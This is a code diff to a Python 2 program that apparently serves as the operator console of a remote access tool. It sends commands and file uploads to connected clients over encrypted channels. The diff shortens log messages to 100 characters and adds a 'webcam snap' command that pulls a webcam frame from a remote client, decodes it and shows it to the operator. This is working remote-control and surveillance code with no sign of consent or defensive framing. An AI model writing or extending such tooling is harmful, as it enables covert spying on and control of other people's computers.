@@ -14,6 +14,7 @@ from Crypto.Random import random
 import zlib
 import base64
 import hashlib
+from PIL import Image
 
 import __builtin__ 
 
@@ -129,18 +130,18 @@ class Channel:
 		logging.debug("Channel created with ID "+str(ord(id)))
 
 	def write_input(self, data): # This function is used to feed data into a channel.
-		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
+		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
 		self.input_queue.put(data)
 		
 	def read_input(self, blocking=True): # This function is used to read data from a channel.
 		try:
 			data = self.input_queue.get(blocking)
-			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
+			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
 			return data
 		except Queue.Empty: return None
 		
 	def write_output(self, data): # This function is used to send data to the handler.
-		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
+		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip()[:100])
 		self.output_queue.put(self.id+data)
 		
 	def write_wait(self, data):
@@ -210,7 +211,7 @@ class Transport:
 		while not ct.stopped() and not self.disconnected:
 			data = self.master_queue.get()
 			self.send(data)
-			logging.debug("Sent data to client #"+str(self.client_id)+": "+data[1:])
+			logging.debug("Sent data to client #"+str(self.client_id)+": "+data[1:][:100])
 			
 	def receiver_loop(self):
 		ct = threading.currentThread()
@@ -218,22 +219,22 @@ class Transport:
 			data = self.recv()
 			try:
 				identifier, data = data[0], data[1:]
-				logging.debug("Received data from client #"+str(self.client_id)+": "+data.strip())
+				logging.debug("Received data from client #"+str(self.client_id)+": "+data.strip()[:100])
 				self.channels[identifier].write_input(data)
 			except Exception as e:
-				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
+				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip()[:100])
 				except: logging.critical("Something went very, very wrong.")
 				
 	def signal_processor(self):
 		ct = threading.currentThread()
 		while not ct.stopped():
 			signal = self.signal_channel.read_input()
-			logging.info("Got signal: "+signal)
+			logging.info("Got signal: "+signal[:100])
 			if signal == "CREATE_CHANNEL":
 				pass
 				
 	def signal(self, data):
-		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data)
+		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data[:100])
 		self.master_queue.put(self.signal_channel.id+data)
 				
 	def create_channel(self):
@@ -310,6 +311,22 @@ class Client:
 		time.sleep(2)
 		ch.write_output(chr(255)*50)
 		time.sleep(5)
+		
+	def display_snap(self):
+		data = ""
+		while not data.endswith(">>"):
+			data += self.recv()
+			
+		data = data[:-3]
+		
+		img_data, width, height, junk = data.split("|")
+		width, height = int(width), int(height)
+		img_data = base64.b64decode(img_data)
+		
+		Image.frombytes('RGB', (width, height), img_data, 'raw', 'BGR', 0, -1).show()
+		
+		return
+		
 
 	def interact(self):
 		logging.info("Starting interaction with client #"+str(self.id))
@@ -345,6 +362,11 @@ class Client:
 				
 			if user_input.startswith("upload"):
 				self.upload(user_input.split()[1])
+				user_input = "cd ."
+				
+			elif user_input.startswith("webcam snap"):
+				self.send(user_input)
+				self.display_snap()
 				user_input = "cd ."
 
 			self.send(user_input)
